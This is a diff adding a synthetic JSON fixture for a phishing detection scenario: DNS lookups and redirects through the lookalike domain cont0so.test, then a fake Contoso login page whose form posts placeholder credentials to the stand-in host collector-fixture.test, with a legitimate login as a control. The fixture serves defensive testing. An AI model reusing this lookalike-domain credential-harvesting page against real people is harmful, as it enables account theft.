@@ -1,0 +1,370 @@
+{
+  "brand-registry-phishing": {
+    "data": {
+      "authorized_domains": [
+        "contoso.test",
+        "accounts.contoso.test"
+      ],
+      "brand": "Contoso",
+      "scope": "synthetic approved login service; collector-fixture.test unlisted; alternate outsourced login requires human verification"
+    },
+    "synthetic_fixture": true
+  },
+  "registry-employee-phish": {
+    "data": {
+      "asset_id": "employee-phish",
+      "device_id": "sensor-employee-phish",
+      "ip": "192.0.2.40",
+      "role": "workstation"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing": {
+    "data": {
+      "id": 0,
+      "event_id": "synthetic-phishing",
+      "event_name": "Synthetic Fixture: phishing",
+      "title": "Phishing钓鱼与凭据提交",
+      "message": "员工浏览器访问仿冒Contoso测试登录页，经历两次有明确事务边的跳转，页面表单向另一测试域提交合成用户名及占位密码。另有真实授权测试域的正常登录作对照；不使用真实凭据或外部站点。",
+      "source": "synthetic-fixture-offline",
+      "severity": "unknown",
+      "event_status": "new",
+      "current_round": 0,
+      "created_at": "2026-10-15T00:59:50Z",
+      "updated_at": "2026-10-15T01:00:21Z",
+      "review_status": "pending",
+      "analysis_version": 0,
+      "aggregation_closed": false,
+      "last_seen_at": "2026-10-15T01:00:21Z"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0001-tcp": {
+    "data": {
+      "connection": {
+        "transport": "tcp",
+        "outcome_verified": true,
+        "source_id": "synthetic-phishing-0001-tcp",
+        "time": "2026-10-15T01:00:00Z",
+        "asset_id": "employee-phish",
+        "destination": "203.0.113.40",
+        "port": 80,
+        "app_protocol": "http",
+        "protocol_parsed": true,
+        "payload_bytes": 128,
+        "tcp_state": "ESTABLISHED",
+        "session_id": "synthetic-phishing-0001-tcp:session"
+      },
+      "hit": {
+        "hit_id": "synthetic-phishing-0001-tcp",
+        "occurred_at": "2026-10-15T01:00:00Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      }
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0002-http": {
+    "data": {
+      "hit": {
+        "hit_id": "synthetic-phishing-0002-http",
+        "occurred_at": "2026-10-15T01:00:01Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      },
+      "http": {
+        "request_id": "synthetic-phishing-tx-0002:request",
+        "source_id": "synthetic-phishing-0002-http",
+        "transaction_id": "synthetic-phishing-tx-0002",
+        "session_id": "synthetic-phishing-tx-0002:session",
+        "time": "2026-10-15T01:00:01Z",
+        "url": "http://cont0so.test/start",
+        "method": "GET",
+        "user_agent": "FixtureAgent/1.0",
+        "fields": {},
+        "body_length": 0,
+        "truncated": false,
+        "response_url": "http://cont0so.test/start",
+        "response_status": 302,
+        "response_location": "http://cont0so.test/continue",
+        "response_verified": true,
+        "form_action": "",
+        "redirect_to_transaction_id": "synthetic-phishing-tx-0003",
+        "redirect_verified": true,
+        "declared_brand": "Contoso",
+        "brand_claim_verified": true
+      },
+      "raw_request": "GET /start HTTP/1.1\r\nHost: cont0so.test\r\nUser-Agent: FixtureAgent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://portal.test/\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 302 Found\r\nLocation: http://cont0so.test/continue\r\n\r\nSynthetic redirect"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0003-http": {
+    "data": {
+      "hit": {
+        "hit_id": "synthetic-phishing-0003-http",
+        "occurred_at": "2026-10-15T01:00:06Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      },
+      "http": {
+        "request_id": "synthetic-phishing-tx-0003:request",
+        "source_id": "synthetic-phishing-0003-http",
+        "transaction_id": "synthetic-phishing-tx-0003",
+        "session_id": "synthetic-phishing-tx-0003:session",
+        "time": "2026-10-15T01:00:06Z",
+        "url": "http://cont0so.test/continue",
+        "method": "GET",
+        "user_agent": "FixtureAgent/1.0",
+        "fields": {},
+        "body_length": 0,
+        "truncated": false,
+        "response_url": "http://cont0so.test/continue",
+        "response_status": 302,
+        "response_location": "http://cont0so.test/login",
+        "response_verified": true,
+        "form_action": "",
+        "redirect_to_transaction_id": "synthetic-phishing-tx-0004",
+        "redirect_verified": true,
+        "declared_brand": "Contoso",
+        "brand_claim_verified": true
+      },
+      "raw_request": "GET /continue HTTP/1.1\r\nHost: cont0so.test\r\nUser-Agent: FixtureAgent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://portal.test/\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 302 Found\r\nLocation: http://cont0so.test/login\r\n\r\nSynthetic redirect"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0004-http": {
+    "data": {
+      "hit": {
+        "hit_id": "synthetic-phishing-0004-http",
+        "occurred_at": "2026-10-15T01:00:11Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      },
+      "http": {
+        "request_id": "synthetic-phishing-tx-0004:request",
+        "source_id": "synthetic-phishing-0004-http",
+        "transaction_id": "synthetic-phishing-tx-0004",
+        "session_id": "synthetic-phishing-tx-0004:session",
+        "time": "2026-10-15T01:00:11Z",
+        "url": "http://cont0so.test/login",
+        "method": "GET",
+        "user_agent": "FixtureAgent/1.0",
+        "fields": {},
+        "body_length": 0,
+        "truncated": false,
+        "response_url": "http://cont0so.test/login",
+        "response_status": 200,
+        "response_location": "",
+        "response_verified": true,
+        "form_action": "http://collector-fixture.test/submit",
+        "redirect_to_transaction_id": "",
+        "redirect_verified": false,
+        "declared_brand": "Contoso",
+        "brand_claim_verified": true
+      },
+      "raw_request": "GET /login HTTP/1.1\r\nHost: cont0so.test\r\nUser-Agent: FixtureAgent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://portal.test/\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\n\r\n\u003chtml\u003e\u003ctitle\u003eContoso secure account verification\u003c/title\u003e\u003ch1\u003eContoso sign in - verify immediately\u003c/h1\u003e\u003cform action=\"http://collector-fixture.test/submit\" method=\"POST\"\u003e\u003cinput name=\"username\"\u003e\u003cinput name=\"password\" type=\"password\"\u003e\u003cbutton\u003eVerify account\u003c/button\u003e\u003c/form\u003e\u003c/html\u003e"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0005-http": {
+    "data": {
+      "hit": {
+        "hit_id": "synthetic-phishing-0005-http",
+        "occurred_at": "2026-10-15T01:00:16Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      },
+      "http": {
+        "request_id": "synthetic-phishing-tx-0005:request",
+        "source_id": "synthetic-phishing-0005-http",
+        "transaction_id": "synthetic-phishing-tx-0005",
+        "session_id": "synthetic-phishing-tx-0005:session",
+        "time": "2026-10-15T01:00:16Z",
+        "url": "http://collector-fixture.test/submit",
+        "method": "POST",
+        "user_agent": "FixtureAgent/1.0",
+        "fields": {
+          "password": "PLACEHOLDER_NOT_A_SECRET",
+          "username": "synthetic_user"
+        },
+        "body_length": 57,
+        "truncated": false,
+        "response_url": "http://collector-fixture.test/submit",
+        "response_status": 200,
+        "response_location": "",
+        "response_verified": true,
+        "form_action": "",
+        "redirect_to_transaction_id": "",
+        "redirect_verified": false,
+        "declared_brand": "Contoso",
+        "brand_claim_verified": true
+      },
+      "raw_request": "POST /submit HTTP/1.1\r\nHost: collector-fixture.test\r\nUser-Agent: FixtureAgent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://portal.test/\r\nContent-Length: 57\r\n\r\nusername=synthetic_user\u0026password=PLACEHOLDER_NOT_A_SECRET",
+      "response": "HTTP/1.1 200 OK\r\n\r\nSynthetic form received; no credential misuse established"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0006-http": {
+    "data": {
+      "hit": {
+        "hit_id": "synthetic-phishing-0006-http",
+        "occurred_at": "2026-10-15T01:00:21Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "tcp://203.0.113.40:80",
+          "device_id": "sensor-employee-phish"
+        }
+      },
+      "http": {
+        "request_id": "synthetic-phishing-tx-0006:request",
+        "source_id": "synthetic-phishing-0006-http",
+        "transaction_id": "synthetic-phishing-tx-0006",
+        "session_id": "synthetic-phishing-tx-0006:session",
+        "time": "2026-10-15T01:00:21Z",
+        "url": "http://accounts.contoso.test/login",
+        "method": "POST",
+        "user_agent": "FixtureAgent/1.0",
+        "fields": {
+          "password": "PLACEHOLDER_NOT_A_SECRET",
+          "username": "synthetic_user"
+        },
+        "body_length": 57,
+        "truncated": false,
+        "response_url": "http://accounts.contoso.test/login",
+        "response_status": 200,
+        "response_location": "",
+        "response_verified": true,
+        "form_action": "",
+        "redirect_to_transaction_id": "",
+        "redirect_verified": false,
+        "declared_brand": "Contoso",
+        "brand_claim_verified": true
+      },
+      "raw_request": "POST /login HTTP/1.1\r\nHost: accounts.contoso.test\r\nUser-Agent: FixtureAgent/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: http://portal.test/\r\nContent-Length: 57\r\n\r\nusername=synthetic_user\u0026password=PLACEHOLDER_NOT_A_SECRET",
+      "response": "HTTP/1.1 200 OK\r\n\r\nSynthetic form received; no credential misuse established"
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0007-dns": {
+    "data": {
+      "dns": {
+        "source_id": "synthetic-phishing-0007-dns",
+        "time": "2026-10-15T00:59:50Z",
+        "domain": "cont0so.test",
+        "rcode": 0,
+        "r_code_known": true,
+        "answers": [
+          "203.0.113.40"
+        ]
+      },
+      "hit": {
+        "hit_id": "synthetic-phishing-0007-dns",
+        "occurred_at": "2026-10-15T00:59:50Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "udp://192.0.2.53:53",
+          "device_id": "sensor-employee-phish"
+        }
+      }
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0008-dns": {
+    "data": {
+      "dns": {
+        "source_id": "synthetic-phishing-0008-dns",
+        "time": "2026-10-15T00:59:51Z",
+        "domain": "collector-fixture.test",
+        "rcode": 0,
+        "r_code_known": true,
+        "answers": [
+          "203.0.113.40"
+        ]
+      },
+      "hit": {
+        "hit_id": "synthetic-phishing-0008-dns",
+        "occurred_at": "2026-10-15T00:59:51Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "udp://192.0.2.53:53",
+          "device_id": "sensor-employee-phish"
+        }
+      }
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing-0009-dns": {
+    "data": {
+      "dns": {
+        "source_id": "synthetic-phishing-0009-dns",
+        "time": "2026-10-15T00:59:52Z",
+        "domain": "accounts.contoso.test",
+        "rcode": 0,
+        "r_code_known": true,
+        "answers": [
+          "203.0.113.40"
+        ]
+      },
+      "hit": {
+        "hit_id": "synthetic-phishing-0009-dns",
+        "occurred_at": "2026-10-15T00:59:52Z",
+        "packets": null,
+        "scope": {
+          "asset_id": "employee-phish",
+          "endpoint_id": "udp://192.0.2.53:53",
+          "device_id": "sensor-employee-phish"
+        }
+      }
+    },
+    "synthetic_fixture": true
+  },
+  "synthetic-phishing:1": {
+    "data": {
+      "event_id": "synthetic-phishing",
+      "snapshot_version": 1,
+      "source_events": [
+        "synthetic-phishing"
+      ],
+      "watermark": 1,
+      "revision_watermark": 1,
+      "count": 9,
+      "context": {
+        "event_background": "员工浏览器访问仿冒Contoso测试登录页，经历两次有明确事务边的跳转，页面表单向另一测试域提交合成用户名及占位密码。另有真实授权测试域的正常登录作对照；不使用真实凭据或外部站点。",
+        "first_time": "2026-10-15T00:59:50Z",
+        "last_time": "2026-10-15T01:00:21Z",
+        "occurrence_count": 9,
+        "scenario_id": "phishing",
+        "synthetic_fixture": true
+      },
+      "evidence": null,
+      "input_manifest": {}
+    },
+    "synthetic_fixture": true
+  }
+}
